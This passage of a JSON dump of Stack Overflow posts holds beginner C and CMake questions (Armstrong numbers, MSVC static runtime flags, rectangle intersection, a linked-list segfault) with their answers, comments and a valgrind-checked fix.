"registered", "profile_image": "https://lh3.googleusercontent.com/-14LLVU8-EtY/AAAAAAAAAAI/AAAAAAAAABI/3aNWcr2Z2ps/photo.jpg?sz=128", "display_name": "Anand Yeole", "link": "https://stackoverflow.com/users/11158324/anand-yeole"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 47, "favorite_count": 0, "answer_count": 2, "score": -2, "last_activity_date": 1551862209, "creation_date": 1551859649, "last_edit_date": 1551862209, "question_id": 55018293, "link": "https://stackoverflow.com/questions/55018293/to-print-amstrong-no-from-100-to-10000-in-c", "title": "to print amstrong no from 100 to 10000 in c", "body": "<p>code dosen't throw any error but dosen't give desired output\nusing ubuntu for execution \nbut output dosen't show a single value\noutput shown is as follows\nAmstrong no from 100 to 10000 are\nv\nv\nv</p>\n\n<pre><code>/* Print Amstrong no from 100 to 10000 */\n#include&lt;stdio.h&gt;\n#include&lt;math.h&gt;\nvoid main()\n{\n    int orignal,rem,no,result=0,n=0,i;\n    printf(\"Amstrong no from 100 to 10000 are\\nv\\nv\\nv\\n\");\n    for(i=100;i&lt;=1000;i++)\n    {\n        orignal=i;\n        while(orignal!=0)\n        {\n            orignal/=10;\n            ++n;\n        }\n        orignal=i;\n        while(orignal!=0)\n        {\n            rem=orignal%10;\n            result+=pow(rem,n);\n            orignal/=10;\n        }\n        if(result==i)\n            printf(\"%d\\n\",i);\n        result=0;\n        n=0;\n    }\n}\n</code></pre>\n"}, {"tags": ["c", "cmake", "clion"], "comments": [{"owner": {"reputation": 3860, "user_id": 5251059, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/93c9c608467b21bce1d709b56bf6d39d?s=128&d=identicon&r=PG&f=1", "display_name": "vre", "link": "https://stackoverflow.com/users/5251059/vre"}, "edited": false, "score": 0, "creation_date": 1551872245, "post_id": 55018218, "comment_id": 96797642, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/10113017/setting-the-msvc-runtime-in-cmake\" title=\"setting the msvc runtime in cmake\">stackoverflow.com/questions/10113017/&hellip;</a>"}], "answers": [{"tags": [], "owner": {"reputation": 1447, "user_id": 6746897, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/1eb640fcdc6847c55c189ceddb6afca5?s=128&d=identicon&r=PG&f=1", "display_name": "Julien", "link": "https://stackoverflow.com/users/6746897/julien"}, "is_accepted": false, "score": 0, "last_activity_date": 1551862061, "creation_date": 1551862061, "answer_id": 55018893, "question_id": 55018218, "link": "https://stackoverflow.com/questions/55018218/static-linking-lib-files-in-cmake/55018893#55018893", "title": "Static linking .lib files in cmake", "body": "<p>Cmake had commands to automatically set almost all these flags.</p>\n\n<p>Try adding <code>add_library(iup.dll STATIC IMPORTED)</code> before the <code>target_link_libraries</code></p>\n\n<p><a href=\"https://cmake.org/cmake/help/v3.8/command/add_library.html\" rel=\"nofollow noreferrer\">Cmake doc</a></p>\n"}, {"tags": [], "owner": {"reputation": 3860, "user_id": 5251059, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/93c9c608467b21bce1d709b56bf6d39d?s=128&d=identicon&r=PG&f=1", "display_name": "vre", "link": "https://stackoverflow.com/users/5251059/vre"}, "is_accepted": false, "score": 0, "last_activity_date": 1551872156, "creation_date": 1551872156, "answer_id": 55022173, "question_id": 55018218, "link": "https://stackoverflow.com/questions/55018218/static-linking-lib-files-in-cmake/55022173#55022173", "title": "Static linking .lib files in cmake", "body": "<p>By default CMake uses the MSVC dynamic runtime library (<code>/MD</code>) when building static or shared libraries.</p>\n\n<p>You need to replace the <code>/MD</code> setting in the <code>CMAKE_C_FLAGS</code>/<code>CMAKE_CXX_FLAGS</code> variables with <code>/MT</code>.\nThis can be done by the follwoing commands:</p>\n\n<pre><code>string(REGEX REPLACE \"/MD\" \"/MT\" CMAKE_C_FLAGS \"${CMAKE_C_FLAGS}\")\nstring(REGEX REPLACE \"/MD\" \"/MT\" CMAKE_CXX_FLAGS \"${CMAKE_CXX_FLAGS}\")\n</code></pre>\n\n<p>For a complete solution please see the <a href=\"https://stackoverflow.com/questions/10113017/setting-the-msvc-runtime-in-cmake\">following post</a></p>\n"}, {"tags": [], "owner": {"reputation": 2152, "user_id": 3478155, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/24c1f942cac00e4715ebcbfc2a6291b4?s=128&d=identicon&r=PG&f=1", "display_name": "ilw", "link": "https://stackoverflow.com/users/3478155/ilw"}, "is_accepted": false, "score": 0, "last_activity_date": 1552144812, "creation_date": 1552144812, "answer_id": 55078811, "question_id": 55018218, "link": "https://stackoverflow.com/questions/55018218/static-linking-lib-files-in-cmake/55078811#55078811", "title": "Static linking .lib files in cmake", "body": "<p>Another options:</p>\n\n<pre><code>set_target_properties(TARGET_LIB PROPERTIES\n    COMPILE_OPTIONS \"$&lt;$&lt;CONFIG:Debug&gt;:/MTd&gt;$&lt;$&lt;CONFIG:Release&gt;:/MT&gt;\"\n    )\n</code></pre>\n"}], "owner": {"reputation": 29, "user_id": 7769996, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/cumNl.jpg?s=128&g=1", "display_name": "anymate98", "link": "https://stackoverflow.com/users/7769996/anymate98"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 226, "favorite_count": 0, "answer_count": 3, "score": 1, "last_activity_date": 1552144812, "creation_date": 1551859294, "last_edit_date": 1551859656, "question_id": 55018218, "link": "https://stackoverflow.com/questions/55018218/static-linking-lib-files-in-cmake", "title": "Static linking .lib files in cmake", "body": "<p>I am trying to use IUP to create a gui program in Windows 10. I am also using Clion+MSVC as an IDE. IUP has both .lib and .dll files for download and all goes well when I don't specify how to link in cmake; cmake automatically tries to link dynamically with iup.dll when there are no custom flags about linking.</p>\n\n<p>However, when I try to statically link iup.dll with a compiler flag <code>/MT</code>, the compiler automatically changes <code>/MT</code> to <code>/MD</code> and just link dynamically.</p>\n\n<p>Here's the cmake code I used to force compiler static linking:</p>\n\n<pre><code>set(CMAKE_C_FLAGS \"${CMAKE_C_FLAGS} /MT\")\n</code></pre>\n\n<p>and then I get this warning:</p>\n\n<pre><code>cl : Command line warning D9025 : overriding '/MT' with '/MD'\n</code></pre>\n\n<p>Any way to \"force\" cmake and compiler to statically link library to my program?</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 3, "creation_date": 1551854835, "post_id": 55017120, "comment_id": 96787903, "body": "What is the output you did expect? Have you tried to step through the code in a debugger to see that it does what you expect it to do? You could also shave of parts of the code, or at least skip some of the empty lines, in order to make a <a href=\"https://stackoverflow.com/help/mcve\"><b>Minimal</b>, Complete, and Verifiable Example</a>."}, {"owner": {"reputation": 16785, "user_id": 3355476, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/YdMWy.jpg?s=128&g=1", "display_name": "Codor", "link": "https://stackoverflow.com/users/3355476/codor"}, "edited": false, "score": 1, "creation_date": 1551855016, "post_id": 55017120, "comment_id": 96787984, "body": "What is the expected output of <code>intersection</code> if the arguments don&#39;t overlap?"}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 4, "creation_date": 1551855039, "post_id": 55017120, "comment_id": 96787994, "body": "And are you sure that it&#39;s the <code>min</code>, <code>max</code> and <code>canonicalize</code> functions that are wrong? It&#39;s not something missing from your <code>intersection</code> function? Something you should quite easy find out if you used a debugger."}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1551856982, "post_id": 55017120, "comment_id": 96788833, "body": "Why did you put a blank line between <i>each</i> line in your code? That doesn&#39;t make it more readable."}, {"owner": {"reputation": 716, "user_id": 6507170, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EdjYE.png?s=128&g=1", "display_name": "priojeet priyom", "link": "https://stackoverflow.com/users/6507170/priojeet-priyom"}, "edited": false, "score": 1, "creation_date": 1551858885, "post_id": 55017120, "comment_id": 96789742, "body": "Please try explaining your code through commenting lines above not so obvious function declaration. It helps others in helping you."}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1551891249, "post_id": 55017120, "comment_id": 96809219, "body": "I&#39;m pretty sure you need to canonicalize the rectangles inside the <code>intersection</code> function before doing anything. There may be other problems, I didn&#39;t check."}], "answers": [{"tags": [], "owner": {"reputation": 716, "user_id": 6507170, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EdjYE.png?s=128&g=1", "display_name": "priojeet priyom", "link": "https://stackoverflow.com/users/6507170/priojeet-priyom"}, "is_accepted": false, "score": 0, "last_activity_date": 1551857806, "creation_date": 1551857806, "answer_id": 55017854, "question_id": 55017120, "link": "https://stackoverflow.com/questions/55017120/why-max-min-and-canocalise-function-not-working-in-c/55017854#55017854", "title": "Why max ,min and canocalise function not working in c?", "body": "<p>Not sure what you have tried doing in intersection function so assuming it is working correctly for you.</p>\n\n<pre><code>if(r.width&lt;0)\n\n{\n\n     r.width=-r.width;\n\n     r.x=r.x-r.width;\n\n}\n\nif(r.height&lt;0) // to handle when height and width both are less than zero (r2)\n\n{\n\n    r.height=-r.height;\n\n    r.y=r.y-r.height;\n\n }\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 11140537, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-EscJcqNwoZY/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rfwVg7FrR9GAMxp5Jd2EejxlrL-iQ/mo/photo.jpg?sz=128", "display_name": "NITESH MISHRA", "link": "https://stackoverflow.com/users/11140537/nitesh-mishra"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 105, "favorite_count": 0, "answer_count": 1, "score": -3, "last_activity_date": 1551888424, "creation_date": 1551854647, "question_id": 55017120, "link": "https://stackoverflow.com/questions/55017120/why-max-min-and-canocalise-function-not-working-in-c", "title": "Why max ,min and canocalise function not working in c?", "body": "<p>I am writing c program to calculate intersection of rectangle but I am not able to get the expected output.The canocalise function,max and min function are not working. Please help me.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\n#include &lt;stdlib.h&gt;\n\n//I've provided \"min\" and \"max\" functions in\n\n//case they are useful to you\n\nint min (int a, int b) {\n\nif (a &lt; b) {\n\n      return a;\n\n}\n\nreturn b;\n\n}\n\nint max (int a, int b) {\n\n     if (a &gt; b) {\n\n     return a;\n\n}\n\nreturn b;\n\n}\n\n//Declare your rectangle structure here!\n\ntypedef struct re{\n\nint x,y,width,height;\n\n}rectangle;\n\nrectangle canonicalize(rectangle r) {\n\n//WRITE THIS FUNCTION\n\nif(r.width&lt;0)\n\n{\n\n     r.width=-r.width;\n\n     r.x=r.x-r.width;\n\n}\n\nelse if(r.height&lt;0)\n\n{\n\n    r.height=-r.height;\n\n    r.y=r.y-r.height;\n\n }\n\n return r;\n\n }\n\n rectangle intersection(rectangle r1, rectangle r2) {\n\n//WRITE THIS FUNCTION\n\n r1.x=max(r1.x,r2.x);\n\n r1.y=max(r1.y,r2.y);\n\n r1.width=min(r1.width,r2.width);\n\n r1.height=min(r1.height,r2.height);\n\n if(r1.x&gt;r1.width || r1.y&gt;r1.height)\n\n      {\n\n       }\n\n return r1;\n\n }\n\n //You should not need to modify any code below this line\n\n void printRectangle(rectangle r) {\n\n r = canonicalize(r);\n\n if (r.width == 0 &amp;&amp; r.height == 0) {\n\n printf(\"&lt;empty&gt;\\n\");\n\n }\n\n else {\n\n printf(\"(%d,%d) to (%d,%d)\\n\", r.x,r.y,r.x + r.width,r.y + r.height);\n\n }\n\n }\n\n  int main (void) {\n\n  rectangle r1;\n\n  rectangle r2;\n\n  rectangle r3;\n\n  rectangle r4;\n\n  r1.x = 2;\n\n  r1.y = 3;\n\n  r1.width = 5;\n\n  r1.height = 6;\n\n  printf(\"r1 is \");\n\n  printRectangle(r1);\n\n  r2.x = 4;\n\n  r2.y = 5;\n\n  r2.width = -5;\n\n  r2.height = -7;\n\n  printf(\"r2 is \");\n\n  printRectangle(r2);\n\n  r3.x = -2;\n\n  r3.y = 7;\n\n  r3.width = 7;\n\n  r3.height = -10;\n\n  printf(\"r3 is \");\n\n  printRectangle(r3);\n\n  r4.x = 0;\n\n  r4.y = 7;\n\n  r4.width = -4;\n\n  r4.height = 2;\n\n  printf(\"r4 is \");\n\n  printRectangle(r4);\n\n  //test everything with r1\n\n  rectangle i = intersection(r1,r1);\n\n  printf(\"intersection(r1,r1): \");\n\n  printRectangle(i);\n\n  i = intersection(r1,r2);\n\n  printf(\"intersection(r1,r2): \");\n\n  printRectangle(i);\n\n  i = intersection(r1,r3);\n\n  printf(\"intersection(r1,r3): \");\n\n  printRectangle(i);\n\n  i = intersection(r1,r4);\n\n  printf(\"intersection(r1,r4): \");\n\n  printRectangle(i);\n\n //test everything with r2\n\n i = intersection(r2,r1);\n\n printf(\"intersection(r2,r1): \");\n\n printRectangle(i);\n\n i = intersection(r2,r2);\n\n printf(\"intersection(r2,r2): \");\n\n printRectangle(i);\n\n i = intersection(r2,r3);\n\n printf(\"intersection(r2,r3): \");\n\n printRectangle(i);\n\n i = intersection(r2,r4);\n\n printf(\"intersection(r2,r4): \");\n\n printRectangle(i);\n\n //test everything with r3\n\n i = intersection(r3,r1);\n\n printf(\"intersection(r3,r1): \");\n\n printRectangle(i);\n\n i = intersection(r3,r2);\n\n printf(\"intersection(r3,r2): \");\n\n printRectangle(i);\n\n i = intersection(r3,r3);\n\n printf(\"intersection(r3,r3): \");\n\n printRectangle(i);\n\n i = intersection(r3,r4);\n\n printf(\"intersection(r3,r4): \");\n\n printRectangle(i);\n\n //test everything with r4\n\n i = intersection(r4,r1);\n\n printf(\"intersection(r4,r1): \");\n\n printRectangle(i);\n\n i = intersection(r4,r2);\n\n printf(\"intersection(r4,r2): \");\n\n printRectangle(i);\n\n i = intersection(r4,r3);\n\n printf(\"intersection(r4,r3): \");\n\n printRectangle(i);\n\n i = intersection(r4,r4);\n\n printf(\"intersection(r4,r4): \");\n\n printRectangle(i);\n\n return EXIT_SUCCESS;\n\n }\n</code></pre>\n\n<blockquote>\n  <p>Current Output:   </p>\n  \n  <p>r1 is (2,3) to (7,9)</p>\n  \n  <p>r2 is (-1,5) to (4,-2)</p>\n  \n  <p>r3 is (-2,-3) to (5,7)</p>\n  \n  <p>r4 is (-4,7) to (0,9)</p>\n  \n  <p>intersection(r1,r1): (2,3) to (7,9)</p>\n  \n  <p>intersection(r1,r2): (-1,5) to (4,-2)</p>\n  \n  <p>intersection(r1,r3): (2,-3) to (7,7)</p>\n  \n  <p>intersection(r1,r4): (-2,7) to (2,9)</p>\n  \n  <p>intersection(r2,r1): (-1,5) to (4,-2)</p>\n  \n  <p>intersection(r2,r2): (-1,5) to (4,-2)</p>\n  \n  <p>intersection(r2,r3): (-1,7) to (4,-3)</p>\n  \n  <p>intersection(r2,r4): (-1,7) to (4,0)</p>\n  \n  <p>intersection(r3,r1): (2,-3) to (7,7)</p>\n  \n  <p>intersection(r3,r2): (-1,7) to (4,-3)</p>\n  \n  <p>intersection(r3,r3): (-2,-3) to (5,7)</p>\n  \n  <p>intersection(r3,r4): (-4,7) to (0,-3)</p>\n  \n  <p>intersection(r4,r1): (-2,7) to (2,9)</p>\n  \n  <p>intersection(r4,r2): (-1,7) to (4,0)</p>\n  \n  <p>intersection(r4,r3): (-4,7) to (0,-3)</p>\n  \n  <p>intersection(r4,r4): (-4,7) to (0,9)</p>\n</blockquote>\n\n<p>Note that the max, min and canocalise are not working.</p>\n"}, {"tags": ["c", "pointers", "null"], "comments": [{"owner": {"reputation": 791, "user_id": 2422527, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/5e3bbce8f736739dd113201ab2bade2c?s=128&d=identicon&r=PG&f=1", "display_name": "songziming", "link": "https://stackoverflow.com/users/2422527/songziming"}, "edited": false, "score": 1, "creation_date": 1551853159, "post_id": 55016702, "comment_id": 96787265, "body": "what if there&#39;re only one node?"}, {"owner": {"reputation": 358, "user_id": 9345287, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/19659e54eaab9777cd74ca352f612da2?s=128&d=identicon&r=PG&f=1", "display_name": "Breakpoint", "link": "https://stackoverflow.com/users/9345287/breakpoint"}, "reply_to_user": {"reputation": 791, "user_id": 2422527, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/5e3bbce8f736739dd113201ab2bade2c?s=128&d=identicon&r=PG&f=1", "display_name": "songziming", "link": "https://stackoverflow.com/users/2422527/songziming"}, "edited": false, "score": 0, "creation_date": 1551853229, "post_id": 55016702, "comment_id": 96787289, "body": "@songziming in that case traverse-&gt;next will be NULL and nothing happens(because it does not enter the while loop). Which is the expected behavior."}, {"owner": {"reputation": 791, "user_id": 2422527, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/5e3bbce8f736739dd113201ab2bade2c?s=128&d=identicon&r=PG&f=1", "display_name": "songziming", "link": "https://stackoverflow.com/users/2422527/songziming"}, "edited": false, "score": 0, "creation_date": 1551853376, "post_id": 55016702, "comment_id": 96787341, "body": "<code>traverse-&gt;next</code> will be <code>NULL</code>, which means <code>alternative</code> will be <code>NULL</code>. Now you see the problem?"}, {"owner": {"reputation": 31685, "user_id": 2458991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/WWDzI.jpg?s=128&g=1", "display_name": "bruno", "link": "https://stackoverflow.com/users/2458991/bruno"}, "edited": false, "score": 0, "creation_date": 1551853776, "post_id": 55016702, "comment_id": 96787516, "body": "@TotallyNoob look at my answer, I did transformations step by step from your code to show the problem"}], "answers": [{"comments": [{"owner": {"reputation": 358, "user_id": 9345287, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/19659e54eaab9777cd74ca352f612da2?s=128&d=identicon&r=PG&f=1", "display_name": "Breakpoint", "link": "https://stackoverflow.com/users/9345287/breakpoint"}, "edited": false, "score": 0, "creation_date": 1551853328, "post_id": 55016790, "comment_id": 96787321, "body": "In that case traverse-&gt;next will be NULL and nothing happens(because it does not enter the while loop). Which is the expected behavior."}, {"owner": {"reputation": 137, "user_id": 4095118, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/jBN2m.jpg?s=128&g=1", "display_name": "madhu sudhan", "link": "https://stackoverflow.com/users/4095118/madhu-sudhan"}, "reply_to_user": {"reputation": 358, "user_id": 9345287, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/19659e54eaab9777cd74ca352f612da2?s=128&d=identicon&r=PG&f=1", "display_name": "Breakpoint", "link": "https://stackoverflow.com/users/9345287/breakpoint"}, "edited": false, "score": 0, "creation_date": 1551854065, "post_id": 55016790, "comment_id": 96787623, "body": "What if alternate is NULL? If alternate is NULL then in if condition, its NULL -&gt; next . Hence segmentation fault"}, {"owner": {"reputation": 358, "user_id": 9345287, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/19659e54eaab9777cd74ca352f612da2?s=128&d=identicon&r=PG&f=1", "display_name": "Breakpoint", "link": "https://stackoverflow.com/users/9345287/breakpoint"}, "edited": false, "score": 0, "creation_date": 1551854535, "post_id": 55016790, "comment_id": 96787799, "body": "You are talking about first if statement and I corrected that. Still segmentation fault. In the case of while loop it won&#39;t enter it."}], "tags": [], "owner": {"reputation": 137, "user_id": 4095118, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/jBN2m.jpg?s=128&g=1", "display_name": "madhu sudhan", "link": "https://stackoverflow.com/users/4095118/madhu-sudhan"}, "is_accepted": false, "score": -1, "last_activity_date": 1551853221, "creation_date": 1551853221, "answer_id": 55016790, "question_id": 55016702, "link": "https://stackoverflow.com/questions/55016702/checking-if-pointer-is-null-gives-segmentation-fault/55016790#55016790", "title": "Checking if pointer is NULL gives segmentation fault", "body": "<p>I can see a code smell in </p>\n\n<pre><code>if(alternate-&gt;next==NULL)\n    {\n        head-&gt;next=NULL;\n        return;\n    }\n</code></pre>\n\n<p>What if i have a single node? In that case <code>alternate</code> points to null.</p>\n"}, {"comments": [{"owner": {"reputation": 358, "user_id": 9345287, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/19659e54eaab9777cd74ca352f612da2?s=128&d=identicon&r=PG&f=1", "display_name": "Breakpoint", "link": "https://stackoverflow.com/users/9345287/breakpoint"}, "edited": false, "score": 0, "creation_date": 1551854000, "post_id": 55016848, "comment_id": 96787598, "body": "Thanks Bruno. I kind of get what my mistake is but how can I resolve it? In case of even number of nodes I have to drop the last node which needs this condition evaluation."}, {"owner": {"reputation": 31685, "user_id": 2458991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/WWDzI.jpg?s=128&g=1", "display_name": "bruno", "link": "https://stackoverflow.com/users/2458991/bruno"}, "reply_to_user": {"reputation": 358, "user_id": 9345287, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/19659e54eaab9777cd74ca352f612da2?s=128&d=identicon&r=PG&f=1", "display_name": "Breakpoint", "link": "https://stackoverflow.com/users/9345287/breakpoint"}, "edited": false, "score": 0, "creation_date": 1551855628, "post_id": 55016848, "comment_id": 96788242, "body": "@TotallyNoob I edited my answer to put a solution, including a full program to execute it and show it works"}, {"owner": {"reputation": 358, "user_id": 9345287, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/19659e54eaab9777cd74ca352f612da2?s=128&d=identicon&r=PG&f=1", "display_name": "Breakpoint", "link": "https://stackoverflow.com/users/9345287/breakpoint"}, "edited": false, "score": 0, "creation_date": 1551855962, "post_id": 55016848, "comment_id": 96788396, "body": "I can&#39;t thank you enough for the help but it still gives segmentation fault. I feel that this might be problem at their backend since the code works perfectly under <i>valgrind</i>"}, {"owner": {"reputation": 31685, "user_id": 2458991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/WWDzI.jpg?s=128&g=1", "display_name": "bruno", "link": "https://stackoverflow.com/users/2458991/bruno"}, "reply_to_user": {"reputation": 358, "user_id": 9345287, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/19659e54eaab9777cd74ca352f612da2?s=128&d=identicon&r=PG&f=1", "display_name": "Breakpoint", "link": "https://stackoverflow.com/users/9345287/breakpoint"}, "edited": false, "score": 0, "creation_date": 1551857208, "post_id": 55016848, "comment_id": 96788935, "body": "@TotallyNoob may be they also do test with a partial list having an even length ? I edited my answer to also manage that case"}], "tags": [], "owner": {"reputation": 31685, "user_id": 2458991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/WWDzI.jpg?s=128&g=1", "display_name": "bruno", "link": "https://stackoverflow.com/users/2458991/bruno"}, "is_accepted": true, "score": 4, "last_activity_date": 1551857150, "last_edit_date": 1551857150, "creation_date": 1551853501, "answer_id": 55016848, "question_id": 55016702, "link": "https://stackoverflow.com/questions/55016702/checking-if-pointer-is-null-gives-segmentation-fault/55016848#55016848", "title": "Checking if pointer is NULL gives segmentation fault", "body": "<p>you do</p>\n\n<pre><code>while(traverse-&gt;next!=NULL &amp;&amp; alternate-&gt;next!=NULL)\n  traverse-&gt;next = alternate-&gt;next;\n  traverse = traverse-&gt;next;\n  alternate = traverse-&gt;next;\n  if((alternate-&gt;next)==NULL) //presence of this if statement causes segmentation fault\n</code></pre>\n\n<p>so in fact</p>\n\n<pre><code>while(traverse-&gt;next!=NULL &amp;&amp; alternate-&gt;next!=NULL)\n  traverse = alternate-&gt;next;\n  alternate = traverse-&gt;next;\n  if((alternate-&gt;next)==NULL) //presence of this if statement causes segmentation fault\n</code></pre>\n\n<p>so in fact</p>\n\n<pre><code>while(traverse-&gt;next!=NULL &amp;&amp; alternate-&gt;next!=NULL)\n  alternate = alternate-&gt;next-&gt;next;\n  if((alternate-&gt;next)==NULL) //presence of this if statement causes segmentation fault\n</code></pre>\n\n<p>so in fact</p>\n\n<pre><code>while(traverse-&gt;next!=NULL &amp;&amp; alternate-&gt;next!=NULL)\n  if((alternate-&gt;next-&gt;next-&gt;next)==NULL) //presence of this if statement causes segmentation fault\n</code></pre>\n\n<p>when <code>alternate-&gt;next-&gt;next</code> is NULL (not checked by the <em>while</em>) <code>alternate-&gt;next-&gt;next-&gt;next</code> causes your segmentation fault</p>\n\n<hr>\n\n<p>A solution is :</p>\n\n<pre><code>void deleteAlt(struct Node * head)\n{\n  if (head != NULL) {\n    while (head-&gt;next != NULL) {\n      Node * d = head-&gt;next;\n\n      head-&gt;next = head-&gt;next-&gt;next;\n      free(d);\n      head = head-&gt;next;\n    }\n  }\n}\n</code></pre>\n\n<p>A complete program to prove :</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\ntypedef struct Node {\n  int v;\n  struct Node * next;\n} Node;\n\nNode * make(int v, Node * n)\n{\n  Node * r = malloc(sizeof(Node));\n\n  r-&gt;v = v;\n  r-&gt;next = n;\n\n  return r;\n}\n\nvoid pr(Node * l)\n{\n  while (l != NULL) {\n    printf(\"%d \", l-&gt;v);\n    l = l-&gt;next;\n  }\n  putchar('\\n');\n}\n\nvoid deleteAlt(struct Node * head)\n{\n  if (head != NULL) {\n    while (head-&gt;next != NULL) {\n      Node * d = head-&gt;next;\n\n      head-&gt;next = head-&gt;next-&gt;next;\n      free(d);\n      head = head-&gt;next;\n    }\n  }\n}\n\nint main()\n{\n  Node * l = make(1, make(2, make(3, make(4, make(5, NULL)))));\n\n  pr(l);\n  deleteAlt(l);\n  pr(l);\n\n  /* free rest of list */\n  while (l != NULL) {\n    Node * n = l-&gt;next;\n\n    free(l);\n    l = n;\n  }\n}\n</code></pre>\n\n<p>Compilation and execution:</p>\n\n<pre><code>pi@raspberrypi:/tmp $ gcc -pedantc -Wextra l.c\npi@raspberrypi:/tmp $ ./a.out\n1 2 3 4 5 \n1 3 5 \npi@raspberrypi:/tmp $ \n</code></pre>\n\n<p>Execution under <em>valgrind</em> to check memory accesses/leaks</p>\n\n<pre><code>pi@raspberrypi:/tmp $ valgrind ./a.out\n==2479== Memcheck, a memory error detector\n==2479== Copyright (C) 2002-2017, and GNU GPL'd, by Julian Seward et al.\n==2479== Using Valgrind-3.13.0 and LibVEX; rerun with -h for copyright info\n==2479== Command: ./a.out\n==2479== \n1 2 3 4 5 \n1 3 5 \n==2479== \n==2479== HEAP SUMMARY:\n==2479==     in use at exit: 0 bytes in 0 blocks\n==2479==   total heap usage: 6 allocs, 6 frees, 1,064 bytes allocated\n==2479== \n==2479== All heap blocks were freed -- no leaks are possible\n==2479== \n==2479== For counts of detected and suppressed errors, rerun with: -v\n==2479== ERROR SUMMARY: 0 errors from 0 contexts (suppressed: 6 from 3)\n</code></pre>\n\n<hr>\n\n<p>(edit) In case the length of the list can be even the definition must be changed to :</p>\n\n<pre><code>void deleteAlt(struct Node * head)\n{\n  while ((head != NULL) &amp;&amp; (head-&gt;next != NULL)) {\n    Node * d = head-&gt;next;\n\n    head-&gt;next = head-&gt;next-&gt;next;\n    free(d);\n    head = head-&gt;next;\n  }\n}\n</code></pre>\n\n<p>modifying <em>main</em> to check :</p>\n\n<pre><code>int main()\n{\n  {\n    Node * l = make(1, make(2, make(3, make(4, make(5, NULL)))));\n\n    pr(l);\n    deleteAlt(l);\n    pr(l);\n\n    /* free rest of list */\n    while (l != NULL) {\n      Node * n = l-&gt;next;\n\n      free(l);\n      l = n;\n    }\n  }\n  {\n    Node * l = make(1, make(2, make(3, make(4, NULL))));\n\n    pr(l);\n    deleteAlt(l);\n    pr(l);\n\n    /* free rest of list */\n    while (l != NULL) {\n      Node * n = l-&gt;next;\n\n      free(l);\n      l = n;\n    }\n  }\n}\n</code></pre>\n\n<p>Compilation and execution :</p>\n\n<pre><code>pi@raspberrypi:/tmp $ gcc -pedantic -Wextra l.c\npi@raspberrypi:/tmp $ ./a.out\n1 2 3 4 5 \n1 3 5 \n1 2 3 4 \n1 3 \n</code></pre>\n\n<p>and under <em>valgrind</em> :</p>\n\n<pre><code>pi@raspberrypi:/tmp $ valgrind ./a.out\n==3450== Memcheck, a memory error detector\n==3450== Copyright (C) 2002-2017, and GNU GPL'd, by Julian Seward et al.\n==3450== Using Valgrind-3.13.0 and LibVEX; rerun with -h for copyright info\n==3450== Command: ./a.out\n==3450== \n1 2 3 4 5 \n1 3 5 \n1 2 3 4 \n1 3 \n==3450== \n==3450== HEAP SUMMARY:\n==3450==     in use at exit: 0 bytes in 0 blocks\n==3450==   total heap usage: 10 allocs, 10 frees, 1,096 bytes allocated\n==3450== \n==3450== All heap blocks were freed -- no leaks are possible\n==3450== \n==3450== For counts of detected and suppressed errors, rerun with: -v\n==3450== ERROR SUMMARY: 0 errors from 0 contexts (suppressed: 6 from 3)\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 35, "user_id": 10673575, "user_type": "registered", "profile_image": 